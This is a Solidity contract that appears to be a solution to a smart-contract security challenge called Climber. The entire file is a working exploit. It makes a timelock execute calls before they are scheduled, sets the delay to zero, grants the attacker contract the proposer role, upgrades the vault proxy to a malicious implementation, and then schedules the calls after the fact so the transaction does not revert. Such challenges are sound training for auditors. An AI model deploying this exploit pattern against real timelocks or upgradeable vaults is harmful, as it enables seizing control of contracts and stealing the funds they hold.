// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "./ClimberConstants.sol";
import "./BadVault.sol";

/**
 * @title ClimberAttacker
 * @dev Exploit the vulnerabily in ClimberTimeLock and upgrade ClimberVault
 * proxy to our malicious one
 * @author soyccan (soyccan@gmail.com)
 */
contract ClimberAttacker {
    ClimberTimelock immutable private timelock;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 constant private salt = hex"deadbeef";

    constructor(ClimberTimelock _timelock) {
        timelock = _timelock;
    }

    function attack(ClimberVault vault, BadVault badVault) external {
        // update timelock delay to 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(timelock.updateDelay, (0)));

        // grant this attacker contract the proposer role so that it can schedule tasks
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeCall(
            timelock.grantRole,
            (PROPOSER_ROLE, address(this))
        ));

        // upgrade the proxy contract with our malicious logic contract
        // only owner of the vault (the timelock) can perform upgrades
        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeCall(vault.upgradeTo, (address(badVault))));

        // schedule these tasks so that this execution will not be reverted
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeCall(this.schedule, ()));

        // exploit the vulnerability by executing tasks without scheduling them first
        // this achieves arbitrary external call on behalf of the timelock
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
